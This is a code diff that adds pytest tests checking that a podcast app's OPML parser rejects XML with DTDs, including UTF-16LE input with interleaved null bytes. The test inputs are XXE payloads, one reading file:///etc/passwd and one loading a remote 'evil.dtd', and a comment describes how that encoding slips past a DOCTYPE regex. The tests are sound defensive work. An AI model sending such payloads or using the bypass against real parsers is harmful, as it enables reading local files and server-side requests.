@@ -1,6 +1,8 @@
 """OPML import previews first, adds per feed through the normal path and exports follows."""
 
+import pytest
 import test_podcast_search as search_support
+from fastapi import HTTPException
 from fastapi.testclient import TestClient
 
 from wildstring.podcast_opml import build_opml, parse_opml
@@ -61,6 +63,41 @@ def test_parse_rejects_entities_wrong_roots_and_empty_documents(settings, authen
         assert parse(client, "not xml").status_code == 422
         empty = parse(client, "<opml><body><outline text='x'/></body></opml>")
         assert empty.status_code == 422 and empty.json()["detail"] == "podcast_opml_empty"
+
+
+@pytest.mark.parametrize(
+    "declaration",
+    [
+        '<!DOCTYPE opml [<!ENTITY first "expanded"><!ENTITY second "&first;&first;">]>',
+        '<!DOCTYPE opml [<!ENTITY second SYSTEM "file:///etc/passwd">]>',
+        '<!DOCTYPE opml [<!ENTITY % remote SYSTEM "https://example.com/evil.dtd">%remote;]>',
+        '<!DOCTYPE opml SYSTEM "https://example.com/evil.dtd">',
+    ],
+    ids=["nested-entity", "local-file-entity", "remote-parameter-entity", "external-dtd"],
+)
+@pytest.mark.parametrize("encoding", ["utf-8", "utf-16le"])
+def test_parse_rejects_dtds_including_null_interleaved_input(declaration, encoding):
+    document = (
+        f'<?xml version="1.0" encoding="{encoding}"?>{declaration}'
+        '<opml><body><outline xmlUrl="https://example.com/feed" text="&second;"/></body></opml>'
+    )
+    # ASCII UTF-16LE bytes also form a valid JSON string with interleaved NULs.
+    # A byte regex for DOCTYPE misses it, while Expat still recognises the XML.
+    content = document.encode(encoding).decode("utf-8")
+    with pytest.raises(HTTPException) as rejected:
+        parse_opml(content)
+    assert rejected.value.status_code == 422
+    assert rejected.value.detail == "podcast_opml_invalid"
+
+
+def test_parse_allows_comments_and_predefined_entities():
+    parsed = parse_opml(
+        "<opml><!-- An example of a declaration: <!DOCTYPE opml> -->"
+        '<body><outline text="Arts &amp; Music" '
+        'xmlUrl="https://example.com/feed?a=1&amp;b=2"/></body></opml>'
+    )
+    assert parsed["feeds"][0]["title"] == "Arts & Music"
+    assert parsed["feeds"][0]["feed_url"] == "https://example.com/feed?a=1&b=2"
 
 
 def test_parse_marks_catalog_state_without_adding(settings, authenticated_client, itunes, feeds):
